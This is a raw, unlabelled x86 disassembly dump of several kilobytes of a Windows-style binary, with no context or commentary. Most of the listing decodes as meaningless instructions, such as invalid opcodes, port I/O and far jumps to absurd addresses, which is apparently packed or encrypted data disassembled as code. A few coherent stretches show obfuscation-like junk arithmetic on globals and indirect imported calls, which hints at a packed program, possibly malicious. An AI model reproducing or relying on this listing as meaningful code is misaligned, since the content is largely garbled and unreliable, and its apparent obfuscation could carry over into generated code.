  403626:	aad    0xb9
  403628:	add    ch,dl
  40362a:	cmc    
  40362b:	xor    eax,DWORD PTR [ebp+0x29027595]
  403631:	aad    0x73
  403633:	rcr    DWORD PTR [eax-0x60],cl
  403636:	mov    cl,cl
  403638:	mov    eax,ds:0xed477fdf
  40363d:	sub    DWORD PTR [ecx],edi
  40363f:	jne    0x40362a
  403641:	cmp    ebx,DWORD PTR [ebx]
  403643:	xchg   edi,eax
  403644:	je     0x403686
  403646:	mov    eax,ds:0x27db102d
  40364b:	xchg   esp,eax
  40364c:	xlat   BYTE PTR ds:[ebx]
  40364d:	cmp    eax,0x5ce18957
  403652:	repnz stc 
  403654:	retf   0x919e
  403657:	int    0xce
  403659:	pushf  
  40365a:	(bad)  
  40365b:	dec    ecx
  40365c:	add    BYTE PTR [esi],bh
  40365e:	xor    DWORD PTR [ebx-0x3b39d448],edi
  403664:	daa    
  403665:	mov    BYTE PTR [esi-0x19],ah
  403668:	and    eax,edx
  40366a:	mov    edi,0xb3a161d2
  40366f:	enter  0xc2fa,0x37
  403673:	pop    edi
  403674:	pop    edx
  403675:	xchg   edx,eax
  403676:	sbb    eax,DWORD PTR [eax+0x352dd11a]
  40367c:	imul   edi,DWORD PTR [eax-0x71],0xffffff95
  403680:	adc    BYTE PTR [esi-0x4b],al
  403683:	push   ss
  403684:	sub    eax,DWORD PTR [ecx+0xa555962]
  40368a:	in     eax,dx
  40368b:	xor    bh,dl
  40368d:	rcr    BYTE PTR [edx],1
  40368f:	sbb    DWORD PTR [ebx+0x6a],ebx
  403692:	dec    eax
  403693:	mov    ds,esi
  403695:	fld    TBYTE PTR [ebx-0x6cd7537c]
  40369b:	xor    eax,0xf6f2cd05
  4036a0:	mov    ds:0x8168d539,al
  4036a5:	pop    esp
  4036a6:	inc    esp
  4036a7:	push   ecx
  4036a8:	add    al,0xcb
  4036aa:	ror    BYTE PTR [edx],cl
  4036ac:	jno    0x4036b4
  4036ae:	mov    edi,DWORD PTR [ebx]
  4036b0:	mov    ecx,0x2b4b462b
  4036b5:	sbb    ecx,DWORD PTR cs:[ecx]
  4036b8:	add    ebx,DWORD PTR [esi+ecx*2+0x25bcbde6]
  4036bf:	or     dl,BYTE PTR [edx+ecx*4]
  4036c2:	js     0x40368b
  4036c4:	fisub  DWORD PTR [edx-0x44026b3b]
  4036ca:	(bad)  
  4036cb:	ds pop ecx
  4036cd:	(bad)  
  4036ce:	in     al,dx
  4036cf:	call   0x5e8e9e61
  4036d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036d5:	pop    esi
  4036d6:	adc    ebx,DWORD PTR [ebx-0x39]
  4036d9:	stos   BYTE PTR es:[edi],al
  4036da:	cs pop ss
  4036dc:	aas    
  4036dd:	ret    0x7aa4
  4036e0:	aaa    
  4036e1:	loopne 0x40373b
  4036e3:	xlat   BYTE PTR ds:[ebx]
  4036e4:	mov    cl,0xfc
  4036e6:	mov    ds:0xf4635278,eax
  4036eb:	dec    edi
  4036ec:	jle    0x40371d
  4036ee:	dec    esi
  4036ef:	inc    edi
  4036f0:	xchg   DWORD PTR [eax],edi
  4036f2:	dec    ecx
  4036f3:	xor    ch,BYTE PTR [esi+0x2d35294e]
  4036f9:	dec    ebp
  4036fa:	std    
  4036fb:	out    0x17,eax
  4036fd:	xchg   esi,eax
  4036fe:	sub    al,BYTE PTR [edi]
  403700:	dec    ebp
  403701:	aaa    
  403702:	pop    es
  403703:	sub    BYTE PTR [esi+0x416990a2],0x8d
  40370a:	add    al,0xe7
  40370c:	xchg   esi,eax
  40370d:	aas    
  40370e:	call   DWORD PTR [eax+0x13]
  403711:	das    
  403712:	bound  ebx,QWORD PTR [esi-0x4f30d6a0]
  403718:	push   DWORD PTR [ecx]
  40371a:	jecxz  0x4036bc
  40371c:	stos   BYTE PTR es:[edi],al
  40371d:	pusha  
  40371e:	xchg   ebp,eax
  40371f:	sbb    DWORD PTR [ebx+0x65],ebx
  403722:	clc    
  403723:	jecxz  0x403728
  403725:	lds    esp,FWORD PTR [ecx]
  403727:	clc    
  403728:	icebp  
  403729:	lock es enter 0xc961,0xf1
  40372f:	fwait
  403730:	rcr    ecx,1
  403732:	mov    dh,0x13
  403734:	call   0xb4a5:0xef0df9aa
  40373b:	mov    ebx,0xd425232a
  403740:	(bad)  
  403741:	sub    esi,ecx
  403743:	mov    ah,0x3
  403745:	push   esi
  403746:	mov    es,WORD PTR [edx+0x6a2e2bf6]
  40374c:	or     bl,BYTE PTR [ecx-0x6b4aa7e2]
  403752:	xor    cl,BYTE PTR [ecx]
  403754:	mov    dl,0xe1
  403757:	stos   DWORD PTR es:[edi],eax
  403758:	mov    ds:0xdad33809,eax
  40375d:	shl    DWORD PTR [ebx+0x669fad84],cl
  403763:	dec    ecx
  403764:	rol    DWORD PTR [eax-0x3d],0xc2
  403768:	adc    ch,dl
  40376a:	adc    al,BYTE PTR [ebp+ebx*8+0x1]
  40376e:	sti    
  40376f:	sub    ch,BYTE PTR [ecx-0x64]
  403772:	xor    al,0xb2
  403774:	push   edi
  403775:	inc    ebx
  403776:	and    BYTE PTR [ebx-0x78a664c5],bl
  40377c:	mov    ebx,0x426a61c6
  403781:	mov    ecx,0xafffb940
  403786:	dec    eax
  403787:	and    ecx,DWORD PTR [edi-0x42]
  40378a:	inc    ebx
  40378b:	and    eax,0xf5d2d27b
  403790:	or     esi,DWORD PTR [ecx+ebx*2-0x521dee98]
  403797:	clc    
  403798:	push   0x48
  40379a:	or     eax,0xd3015352
  40379f:	sar    BYTE PTR [edi+ecx*1-0x18],cl
  4037a3:	(bad)  
  4037a5:	mov    ds:0xe58787cf,eax
  4037aa:	(bad)  
  4037ab:	ins    DWORD PTR es:[edi],dx
  4037ac:	xor    al,0xcd
  4037ae:	adc    BYTE PTR [esi-0x201925cd],cl
  4037b4:	pop    es
  4037b5:	icebp  
  4037b6:	mov    dh,0x97
  4037b8:	icebp  
  4037b9:	addr16 dec esi
  4037bb:	sbb    esi,DWORD PTR [edi]
  4037bd:	test   dl,0x27
  4037c0:	mov    fs,WORD PTR [edx-0x5c1e1ceb]
  4037c6:	test   DWORD PTR [ebx+eiz*2],0x6937a7f1
  4037cd:	(bad)  
  4037cf:	jno    0x403754
  4037d1:	sar    DWORD PTR [edi+0x69],cl
  4037d4:	jmp    0x9adf:0x31474179
  4037db:	jo     0x4037a2
  4037dd:	or     BYTE PTR [ecx+edi*4-0x7e],dh
  4037e1:	pop    ecx
  4037e2:	push   edi
  4037e3:	or     esp,DWORD PTR [edi+0x2ef9f34f]
  4037e9:	xor    BYTE PTR [edx],bl
  4037eb:	inc    edi
  4037ec:	je     0x403774
  4037ee:	xchg   BYTE PTR [esi+0x4b],ch
  4037f1:	jo     0x4037da
  4037f3:	aam    0x17
  4037f5:	push   0x25
  4037f7:	imul   BYTE PTR [edx-0x42c35546]
  4037fd:	nop
  4037fe:	lahf   
  4037ff:	push   ss
  403800:	dec    eax
  403801:	std    
  403802:	push   eax
  403803:	jp     0x4037f9
  403805:	cmp    al,0x47
  403807:	mov    edx,0xcb8c8114
  40380c:	imul   ebp,DWORD PTR [eax-0x76f9dfe5],0xffffffe3
  403813:	ficom  WORD PTR [ebx]
  403815:	fiadd  WORD PTR [eax]
  403817:	ffree  st(6)
  403819:	add    bh,BYTE PTR [edx-0x4e77cf41]
  40381f:	mov    esi,0xd607ac4f
  403824:	mov    esi,0x5aa8ad54
  403829:	cmc    
  40382a:	mov    al,0xc5
  40382c:	adc    BYTE PTR [edx+0x74],al
  40382f:	xchg   ecx,eax
  403830:	push   eax
  403831:	pop    edi
  403832:	mov    DWORD PTR [ebx+0x42df10ac],esi
  403838:	and    ebp,DWORD PTR [ecx]
  40383a:	pop    eax
  40383b:	mov    bl,0xc4
  40383d:	cli    
  40383e:	xor    al,0x2a
  403840:	out    0x38,eax
  403842:	mov    cl,0x96
  403844:	mov    al,0x58
  403846:	inc    ebp
  403847:	and    BYTE PTR [edi+esi*4+0x7fcb2b5c],bl
  40384e:	pop    ebp
  40384f:	sbb    ecx,DWORD PTR [edi+ebp*8]
  403852:	aam    0xee
  403854:	lods   al,BYTE PTR ds:[esi]
  403855:	add    ecx,ebp
  403857:	retf   
  403858:	sahf   
  403859:	jmp    0x32c3:0x7de8060f
  403860:	lods   al,BYTE PTR ds:[esi]
  403861:	sub    eax,0x72555824
  403866:	sbb    ebx,ecx
  403868:	jp     0x403823
  40386a:	fstp   DWORD PTR [eax]
  40386c:	mov    edx,DWORD PTR [ecx]
  40386e:	or     ebx,DWORD PTR [esi+0x76]
  403871:	iret   
  403872:	sub    eax,0x31862ed8
  403877:	and    esi,ecx
  403879:	pop    es
  40387a:	mov    bl,0xba
  40387c:	int    0xd1
  40387e:	cmp    eax,0xb40473b3
  403883:	inc    edi
  403884:	ss cld 
  403886:	call   0xf6f3:0x4b621054
  40388d:	dec    cl
  40388f:	jns    0x4038fb
  403891:	xchg   ebp,eax
  403892:	jmp    DWORD PTR [edi]
  403894:	mov    dl,0xc6
  403896:	stc    
  403897:	add    BYTE PTR [esi+esi*4],dh
  40389a:	in     eax,dx
  40389b:	sti    
  40389c:	or     bl,BYTE PTR [eax+edx*1-0x5ece9e76]
  4038a3:	or     cl,bh
  4038a5:	std    
  4038a6:	push   ds
  4038a7:	idiv   DWORD PTR ds:0x8034f006
  4038ad:	adc    DWORD PTR [esi+0x63],esp
  4038b0:	sub    eax,0xdc63ac80
  4038b5:	cmp    DWORD PTR [ecx+0x6c],ebp
  4038b8:	push   edx
  4038b9:	imul   BYTE PTR ds:0xd17c8c8c
  4038bf:	mov    dl,0x5c
  4038c1:	jge    0x403928
  4038c3:	stos   BYTE PTR es:[edi],al
  4038c4:	push   ss
  4038c5:	jbe    0x4038d8
  4038c7:	push   ds
  4038c8:	adc    ebp,ebp
  4038ca:	jmp    0x40392d
  4038cc:	push   ebx
  4038cd:	xchg   ecx,eax
  4038ce:	mov    al,0x9d
  4038d0:	xor    cl,ch
  4038d2:	pop    edx
  4038d3:	xchg   edi,eax
  4038d4:	test   ebp,edx
  4038d6:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4038d8:	adc    ebx,esp
  4038da:	cwde   
  4038db:	cwde   
  4038dc:	or     esp,DWORD PTR [ecx-0x66]
  4038df:	cmp    ch,0x1d
  4038e2:	sar    BYTE PTR [esi+esi*8+0x2d1ac0f],1
  4038e9:	xor    DWORD PTR ds:0x4284c5,0x428575
  4038f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4038f6:	mov    ecx,DWORD PTR [ebp+0x18]
  4038f9:	xor    DWORD PTR ds:0x428459,0x428581
  403903:	xor    DWORD PTR [ebp-0x1c],edi
  403906:	adc    DWORD PTR ds:0x428445,0x4aad
  403910:	shl    ecx,0x1e
  403913:	not    DWORD PTR ds:0x42840d
  403919:	xor    ecx,ecx
  40391b:	sub    DWORD PTR ds:0x428559,0x450d
  403925:	or     ecx,DWORD PTR [ebp-0x1c]
  403928:	jmp    0x403cc9
  40392d:	cdq    
  40392e:	jbe    0x40398b
  403930:	fidivr WORD PTR [ebx+eiz*8-0x40084545]
  403937:	mul    BYTE PTR [esi+eiz*4-0x426d8994]
  40393e:	in     eax,dx
  40393f:	mov    esi,0xbec4bdbe
  403944:	mov    esi,0xdaa73eb7
  403949:	xchg   DWORD PTR [edi+0x5b68f5b4],esi
  40394f:	jg     0x403991
  403951:	xor    al,0xdd
  403953:	inc    ecx
  403954:	fadd   DWORD PTR [edi+0x6]
  403957:	test   eax,0x118c67d7
  40395c:	add    al,0x99
  40395e:	dec    edx
  40395f:	mov    es,WORD PTR [eax-0x545a12e3]
  403965:	sub    eax,0x34e074cd
  40396a:	push   0xffffffab
  40396c:	sbb    esi,DWORD PTR [ebx-0x55]
  40396f:	in     al,dx
  403970:	out    dx,eax
  403971:	push   edx
  403972:	jle    0x4039ac
  403974:	leave  
  403975:	push   edi
  403976:	jecxz  0x40396b
  403978:	sbb    al,0xdd
  40397a:	ss mov esi,0x467d0338
  403980:	xchg   ebp,eax
  403981:	xor    cl,BYTE PTR [edi+edx*8-0x6e]
  403985:	in     eax,0x73
  403987:	mov    DWORD PTR [esi+0x1c6cdfd5],0xeca3a508
  403991:	das    
  403992:	sub    dh,BYTE PTR [ebp-0x74]
  403995:	cmc    
  403996:	(bad)  
  403997:	leave  
  403998:	pop    ebp
  403999:	or     eax,0xfb042009
  40399e:	(bad)  
  4039a0:	cmp    bh,BYTE PTR [edx]
  4039a2:	pop    ss
  4039a3:	pop    eax
  4039a4:	ds adc ch,BYTE PTR es:[eax]
  4039a8:	adc    edx,DWORD PTR ds:0xfc2d8470
  4039ae:	pop    esi
  4039af:	icebp  
  4039b0:	push   0xffffffa3
  4039b2:	gs into 
  4039b4:	repz xchg esp,eax
  4039b6:	cli    
  4039b7:	(bad)  
  4039b8:	fnsave [edx+0xe]
  4039bb:	jb     0x4039f6
  4039bd:	fld    TBYTE PTR [ebx-0x2c957b7b]
  4039c3:	cmp    al,BYTE PTR [ecx+0x5c767236]
  4039c9:	mov    cl,BYTE PTR [ebx]
  4039cb:	push   ebp
  4039cc:	or     al,0x5a
  4039ce:	mov    ebx,edx
  4039d0:	mov    ebx,0x6d77a217
  4039d5:	fsubp  st(6),st
  4039d7:	shl    BYTE PTR [edx+0x3fc32d78],0x2e
  4039de:	xchg   ebp,eax
  4039df:	in     eax,0x2d
  4039e1:	(bad)  
  4039e2:	call   0xee54c984
  4039e7:	mov    edi,0x84497cc2
  4039ec:	repnz iret 
  4039ee:	call   0x7828:0x67718a0a
  4039f5:	sub    al,0xfa
  4039f7:	imul   esi,DWORD PTR [ebx-0x6d1589b4],0x6
  4039fe:	int3   
  4039ff:	or     al,0x2
  403a01:	outs   dx,DWORD PTR ds:[esi]
  403a02:	xchg   esi,eax
  403a03:	mov    al,ds:0x769d21d3
  403a08:	mov    edx,0x7173c8f6
  403a0d:	(bad)  
  403a0e:	in     al,dx
  403a0f:	ds cld 
  403a11:	and    al,0x8f
  403a13:	mov    ds:0xb0a62e76,al
  403a18:	in     eax,dx
  403a19:	loop   0x403a77
  403a1b:	dec    ecx
  403a1c:	adc    BYTE PTR [edx+0x65],ah
  403a1f:	test   eax,0xe0b939e2
  403a24:	dec    ebp
  403a25:	push   eax
  403a26:	fwait
  403a27:	retf   
  403a28:	mov    dh,0xc6
  403a2a:	cmp    edx,DWORD PTR [ebx]
  403a2c:	xor    BYTE PTR [ebx+eax*8+0x3f64bbf0],bh
  403a33:	shl    BYTE PTR [esi+0x6d4d811],1
  403a39:	sbb    eax,0x62bee74b
  403a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a3f:	(bad)  
  403a40:	cmp    bl,BYTE PTR [ecx-0x54]
  403a43:	sub    BYTE PTR [eax+0x1],0x3d
  403a47:	push   esp
  403a48:	and    bh,0xfa
  403a4b:	loopne 0x403ab5
  403a4d:	adc    BYTE PTR [ebx],ch
  403a4f:	fstp   QWORD PTR [edi-0x664d9c9a]
  403a55:	adc    eax,0x362d0558
  403a5a:	stos   DWORD PTR es:[edi],eax
  403a5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a5c:	pusha  
  403a5d:	cmc    
  403a5e:	cwde   
  403a5f:	cmp    BYTE PTR [edx+0x7d5bd69a],0x4
  403a66:	jne    0x4039ec
  403a68:	cmc    
  403a69:	je     0x403a03
  403a6b:	xchg   ecx,edi
  403a6d:	(bad)  
  403a6e:	adc    cl,dl
  403a70:	pop    esp
  403a71:	(bad)  
  403a72:	jecxz  0x403a44
  403a74:	and    BYTE PTR [edx-0x39],bl
  403a77:	mov    ss,WORD PTR [eax-0x23b864a]
  403a7d:	dec    BYTE PTR [ecx]
  403a7f:	adc    DWORD PTR [ebp+0xa],eax
  403a82:	addr16 in al,dx
  403a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a85:	cmp    al,0xe1
  403a87:	bound  esp,QWORD PTR [esi]
  403a89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a8a:	xor    BYTE PTR [eax],ah
  403a8c:	aas    
  403a8d:	push   ebp
  403a8e:	and    dl,dh
  403a90:	(bad)  
  403a91:	out    dx,eax
  403a92:	jae    0x403a66
  403a94:	push   esi
  403a95:	fist   DWORD PTR [ecx+0x38]
  403a98:	mov    BYTE PTR [esi],ch
  403a9a:	rcl    BYTE PTR [ecx],1
  403a9c:	xor    eax,0xb16f0d82
  403aa1:	add    DWORD PTR [edi],ebx
  403aa3:	inc    ecx
  403aa4:	xlat   BYTE PTR ds:[ebx]
  403aa5:	arpl   bp,si
  403aa7:	ret    0x4939
  403aaa:	call   0x8d7c2f2d
  403aaf:	test   eax,0xfa9428e4
  403ab4:	inc    edi
  403ab5:	jo     0x403ad2
  403ab7:	cli    
  403ab8:	inc    eax
  403ab9:	mov    bl,0x6d
  403abb:	push   cs
  403abc:	mov    ds:0xec74fb24,eax
  403ac1:	xchg   eax,edi
  403ac3:	xor    al,0x21
  403ac5:	loop   0x403a9d
  403ac7:	inc    edx
  403ac8:	and    ch,BYTE PTR [esi+ebx*2+0x3a4865fa]
  403acf:	push   cs
  403ad0:	cmp    ebx,DWORD PTR [edx-0x57727695]
  403ad6:	lock cmp edi,edi
  403ad9:	inc    ebp
  403ada:	xor    eax,0x5a3293a5
  403adf:	push   esi
  403ae0:	and    bh,bh
  403ae2:	cmp    al,0x37
  403ae4:	adc    al,0xc3
  403ae6:	outs   dx,DWORD PTR ds:[esi]
  403ae7:	jmp    0x403a7d
  403ae9:	lahf   
  403aea:	iret   
  403aeb:	fild   WORD PTR [eax+0xa]
  403aee:	or     ch,BYTE PTR [ebx]
  403af0:	(bad)  
  403af2:	dec    edi
  403af3:	xchg   edx,eax
  403af4:	sub    al,0xbd
  403af6:	fst    QWORD PTR [edi+0x76]
  403af9:	and    DWORD PTR [ecx+0x5ac722b9],ecx
  403aff:	out    dx,al
  403b00:	ins    DWORD PTR es:[edi],dx
  403b01:	stos   BYTE PTR es:[edi],al
  403b02:	cli    
  403b03:	fidivr WORD PTR [esi+edi*4-0x1]
  403b07:	mov    ecx,0x9864afa5
  403b0c:	out    dx,eax
  403b0d:	out    0xfc,al
  403b0f:	mov    ch,0x75
  403b11:	mov    dh,0xef
  403b13:	lods   al,BYTE PTR ds:[esi]
  403b14:	pop    esi
  403b15:	jno    0x403a99
  403b17:	push   esi
  403b18:	(bad)  [esi+esi*1-0x1b]
  403b1c:	loopne 0x403add
  403b1e:	push   ds
  403b1f:	fistp  QWORD PTR [edi]
  403b21:	aad    0xf9
  403b23:	sbb    eax,0x90a2a982
  403b28:	jmp    0x3ab84e85
  403b2d:	jne    0x403b71
  403b2f:	test   BYTE PTR [edi-0x76700ff9],dl
  403b35:	and    dl,BYTE PTR ds:0xb57cb3b6
  403b3b:	fwait
  403b3c:	and    ecx,DWORD PTR [eax]
  403b3e:	and    al,0x21
  403b40:	jecxz  0x403bb1
  403b42:	pop    ebp
  403b43:	rcl    BYTE PTR [edi+0xea0fe9d],cl
  403b49:	inc    ebx
  403b4a:	adc    eax,0xc1dcdf3f
  403b4f:	jle    0x403ad9
  403b51:	xchg   cl,ah
  403b53:	dec    esi
  403b54:	imul   ecx,DWORD PTR [esi],0x16
  403b57:	dec    ebx
  403b58:	sbb    BYTE PTR [ecx-0x37fbb421],bl
  403b5e:	or     esp,ebp
  403b60:	sub    BYTE PTR [ebx],0x66
  403b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b64:	mov    ds:0xd402517e,al
  403b69:	mov    DWORD PTR [ecx-0x700adcc4],ebp
  403b6f:	dec    ecx
  403b70:	mov    dl,0xf5
  403b72:	push   0xb8bfef06
  403b77:	add    ch,BYTE PTR [edi]
  403b79:	mov    ch,BYTE PTR [edi+edx*2]
  403b7c:	add    eax,0x863a9aea
  403b81:	push   eax
  403b82:	cld    
  403b83:	pop    edx
  403b84:	out    dx,al
  403b85:	jecxz  0x403b8b
  403b87:	inc    esp
  403b88:	mov    edi,0xb84d5541
  403b8d:	push   ecx
  403b8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b8f:	outs   dx,DWORD PTR ds:[esi]
  403b90:	cdq    
  403b91:	fbstp  TBYTE PTR [eax]
  403b93:	jno    0x403b47
  403b95:	pop    DWORD PTR [edx+0x7e8931f3]
  403b9b:	loopne 0x403b8d
  403b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b9e:	mov    cl,0x52
  403ba0:	push   edx
  403ba1:	add    bh,0xdd
  403ba4:	jg     0x403be0
  403ba6:	ret    
  403ba7:	mov    al,0x17
  403ba9:	ds dec ecx
  403bab:	lea    ecx,[eax]
  403bad:	nop
  403bae:	outs   dx,BYTE PTR ds:[esi]
  403baf:	adc    esp,ebx
  403bb1:	lock sbb eax,0x8d2c9aa8
  403bb7:	aad    0x2f
  403bb9:	xchg   ebp,eax
  403bba:	int    0xc4
  403bbc:	cmp    DWORD PTR [ebx],edi
  403bbe:	inc    esi
  403bbf:	jbe    0x403bf7
  403bc1:	int3   
  403bc2:	ror    DWORD PTR [ebx-0x4aada502],1
  403bc8:	rcl    BYTE PTR [ecx],0xc0
  403bcb:	add    ebp,eax
  403bcd:	in     al,dx
  403bce:	jnp    0x403b58
  403bd0:	xchg   edx,eax
  403bd1:	mov    eax,0xa7f9465f
  403bd6:	(bad)  
  403bd8:	inc    eax
  403bd9:	ret    0xf7c1
  403bdc:	test   eax,0x82058974
  403be1:	xchg   edi,eax
  403be2:	mov    ebp,0x75a62047
  403be7:	mov    esp,0x3adfde8d
  403bec:	xor    DWORD PTR [eax],0xffffffdc
  403bef:	fmul   DWORD PTR [esi]
  403bf1:	push   esp
  403bf2:	test   bl,al
  403bf4:	mov    dl,0x2a
  403bf6:	push   0xa1f648d4
  403bfb:	jo     0x403c46
  403bfd:	lds    esi,FWORD PTR [edi]
  403bff:	nop
  403c00:	sar    DWORD PTR cs:[ebx],0x7f
  403c04:	mov    dh,0x73
  403c06:	arpl   cx,dx
  403c08:	xlat   BYTE PTR ds:[ebx]
  403c09:	out    0xda,eax
  403c0b:	sub    BYTE PTR [eax+0x65],0x6
  403c0f:	daa    
  403c10:	aas    
  403c11:	cmp    eax,0xa792f4b4
  403c16:	jmp    0x403c19
  403c18:	xlat   BYTE PTR ds:[ebx]
  403c19:	xor    esi,DWORD PTR [edi+0x27]
  403c1c:	pop    esp
  403c1d:	in     eax,0x21
  403c1f:	mov    cs,WORD PTR [ebp-0x5f5df63]
  403c25:	stc    
  403c26:	mov    esi,0x4f43f76
  403c2b:	pop    edx
  403c2c:	lock test al,0xa
  403c2f:	test   eax,0xd38d3fdb
  403c34:	icebp  
  403c35:	sub    ecx,DWORD PTR [ebp-0x77]
  403c38:	mov    ch,0xfa
  403c3a:	push   esp
  403c3b:	push   ds
  403c3c:	shl    DWORD PTR [ebp-0x8],1
  403c3f:	out    dx,al
  403c40:	ins    DWORD PTR es:[edi],dx
  403c41:	adc    DWORD PTR [edx],eax
  403c43:	ins    DWORD PTR es:[edi],dx
  403c44:	retf   
  403c45:	mov    al,ds:0x8bf0619d
  403c4a:	xchg   esp,eax
  403c4b:	js     0x403cbb
  403c4d:	cmc    
  403c4e:	pop    edi
  403c4f:	or     edx,DWORD PTR [esi+esi*1]
  403c52:	fcom   DWORD PTR [edi+0x629b9f37]
  403c58:	xor    BYTE PTR [ebx+0x60f92f4b],ah
  403c5e:	leave  
  403c5f:	inc    edx
  403c60:	add    al,0x63
  403c62:	sbb    cl,BYTE PTR [edi+edx*8-0x9]
  403c66:	adc    eax,DWORD PTR [ebp+0x4f54fbf4]
  403c6c:	rcl    DWORD PTR [edx-0x30],0x9
  403c70:	jge    0x403cd3
  403c72:	and    DWORD PTR [ecx-0x1639f4cc],ebp
  403c78:	fs ins DWORD PTR es:[edi],dx
  403c7a:	cmp    bl,BYTE PTR [ebp-0x1a]
  403c7d:	aas    
  403c7e:	(bad)  
  403c7f:	enter  0x4d06,0x1e
  403c83:	fs ins BYTE PTR es:[edi],dx
  403c85:	(bad)  
  403c87:	inc    ebp
  403c88:	mov    esi,0x7d4ea310
  403c8d:	push   ebp
  403c8e:	inc    esp
  403c8f:	pop    es
  403c90:	push   0xfffffffe
  403c92:	mov    ah,0x62
  403c94:	mov    ah,BYTE PTR [ebp-0x19]
  403c97:	mov    eax,ds:0x6a6e6e83
  403c9c:	add    esi,DWORD PTR [edx+0x51]
  403c9f:	xor    BYTE PTR [ecx-0xa2d2c25],ah
  403ca5:	retf   
  403ca6:	adc    edx,edi
  403ca8:	mov    ebx,0xe3056661
  403cad:	or     eax,eax
  403caf:	xchg   dh,dl
  403cb1:	sahf   
  403cb2:	and    BYTE PTR [eax+esi*8],al
  403cb5:	adc    ebp,edx
  403cb7:	jb     0x403cc1
  403cb9:	cmp    ch,cl
  403cbb:	(bad)  
  403cbc:	ror    BYTE PTR [edi+0x45],0x19
  403cc0:	ret    0xf635
  403cc3:	and    cl,BYTE PTR [ebx]
  403cc5:	or     dh,BYTE PTR [ecx*8+0x2eac179]
  403ccc:	movzx  edx,WORD PTR ds:0x428411
  403cd3:	and    DWORD PTR ds:0x42840d,edx
  403cd9:	mov    edx,DWORD PTR [ebp+0x1c]
  403cdc:	cmp    DWORD PTR ds:0x428475,0x0
  403ce3:	mov    edx,0xb30
  403ce8:	not    DWORD PTR ds:0x42833d
  403cee:	jmp    0x403db9
  403cf3:	mov    DWORD PTR ds:0x428341,0x7955
  403cfd:	mov    DWORD PTR ds:0x4284cd,0x3fbe
  403d07:	cmp    DWORD PTR ds:0x428475,0x0
  403d0e:	jae    0x403d49
  403d14:	push   0x2165
  403d19:	push   0x209b
  403d1e:	push   0x61ab
  403d23:	push   0x585a
  403d28:	push   DWORD PTR [ebp-0x14]
  403d2b:	call   DWORD PTR ds:0x42e0c0
  403d31:	xor    DWORD PTR ds:0x42840d,edi
  403d37:	xor    DWORD PTR ds:0x428419,edi
  403d3d:	xor    edx,DWORD PTR ds:0x428479
  403d43:	sub    DWORD PTR ds:0x428365,edi
  403d49:	sbb    DWORD PTR ds:0x428481,0x3090
  403d53:	sub    DWORD PTR ds:0x428431,ecx
  403d59:	xor    DWORD PTR ds:0x4284dd,edi
  403d5f:	cmp    DWORD PTR ds:0x42854d,0x0
  403d66:	mov    edx,0x71bd
  403d6b:	not    edx
  403d6d:	jmp    0x403db9
  403d72:	mov    edx,0x37a5
  403d77:	mov    edx,0x5337
  403d7c:	cmp    DWORD PTR ds:0x42854d,0x0
  403d83:	jle    0x403dad
  403d89:	push   0x428445
  403d8e:	call   DWORD PTR ds:0x42e0c4
  403d94:	mov    edx,DWORD PTR ds:0x428521
  403d9a:	mov    edx,DWORD PTR [edx]
  403d9c:	and    DWORD PTR ds:0x42832d,edx
  403da2:	adc    DWORD PTR ds:0x428429,0x11e9
  403dac:	dec    edx
  403dad:	and    edx,0xf08
  403db3:	sub    edx,DWORD PTR ds:0x428571
  403db9:	mov    DWORD PTR [ebp-0x2c],ecx
  403dbc:	mov    ecx,DWORD PTR [esi]
  403dbe:	add    DWORD PTR ds:0x428445,ebx
  403dc4:	mov    edx,DWORD PTR [esi+0x4]
  403dc7:	or     DWORD PTR ds:0x428335,0x428349
  403dd1:	shrd   ecx,edx,0x2
  403dd5:	xor    DWORD PTR ds:0x4284d9,0x24cb
  403ddf:	shr    edx,0x2
  403de2:	and    edx,DWORD PTR ds:0x428561
  403de8:	mov    DWORD PTR [ebp-0x1c],ecx
  403deb:	mov    ecx,DWORD PTR [esi]
  403ded:	mov    edx,DWORD PTR [esi+0x4]
  403df0:	xor    DWORD PTR [ebp-0x1c],edi
  403df3:	xor    edx,edx
  403df5:	or     edx,DWORD PTR [ebp-0x1c]
  403df8:	sub    DWORD PTR ds:0x42840d,0x5e3f
  403e02:	shl    ecx,0x1e
  403e05:	sbb    DWORD PTR ds:0x42840d,0x5068
  403e0f:	add    edx,DWORD PTR [ebp-0x2c]
  403e12:	jmp    0x4041b3
  403e17:	bound  ecx,QWORD PTR [ebx-0x73d3f5ff]
  403e1d:	push   0xffffffab
  403e1f:	(bad)  
  403e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e21:	push   ss
  403e22:	ror    ebx,1
  403e24:	lods   eax,DWORD PTR ds:[esi]
  403e25:	(bad)  
  403e26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e27:	mov    esi,0xbdbebef5
  403e2c:	les    edi,FWORD PTR [esi-0x1b48df42]
  403e32:	xchg   ebx,eax
  403e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e34:	fnstsw WORD PTR [ecx]
  403e36:	xchg   edi,eax
  403e37:	or     dl,ah
  403e39:	(bad)  
  403e3a:	out    0x38,al
  403e3c:	add    al,0x99
  403e3e:	inc    edi
  403e3f:	into   
  403e40:	mov    esp,0x8ee62c62
  403e45:	lock call 0xed08:0x96114526
  403e4d:	fmul   DWORD PTR [edi-0x58]
  403e50:	push   0x55d2d19a
  403e55:	test   BYTE PTR [esp+edi*1-0x54],bl
  403e59:	cmp    eax,0x93f36beb
  403e5e:	lock enter 0xd840,0x22
  403e63:	mov    edx,0x8f013aef
  403e68:	sub    al,0x53
  403e6a:	addr16 (bad) 
  403e6c:	xchg   edx,eax
  403e6d:	push   0xa
  403e6f:	or     DWORD PTR [ebp-0x2b5de6ba],esp
  403e75:	jmp    DWORD PTR [edx-0x35]
  403e78:	push   cs
  403e79:	fadd   DWORD PTR [edx+0x46e6d0f7]
  403e7f:	ja     0x403ebd
  403e81:	aad    0xe4
  403e83:	push   esp
  403e84:	push   ebp
